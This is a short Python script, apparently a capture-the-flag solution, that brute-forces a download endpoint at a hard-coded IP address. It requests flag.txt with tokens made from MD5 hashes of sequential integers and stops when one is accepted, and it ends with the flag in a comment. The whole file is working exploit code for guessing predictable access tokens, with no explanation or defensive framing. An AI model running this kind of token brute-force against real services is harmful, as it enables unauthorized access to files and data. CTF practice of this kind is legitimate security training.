#coding=utf-8
import requests
from Crypto.Hash import MD5

file123 = [753, 952, 536]
url = 'http://165.22.22.11:25632/download.php?file=flag.txt&token='

index = 0
while 1:
    h = MD5.new()
    h.update(str(index))
    token = h.hexdigest()
    r = requests.get(url + str(token))
    print 'index : {}, requests : {}, result : {}'.format(index, url + str(token), r.content)
    if 'Invalid' not in r.content and index not in file123:
        break
    else:
        index += 1

# AFFCTF{Pr3dic71bl3_t0k3n5_4r3_b4d}
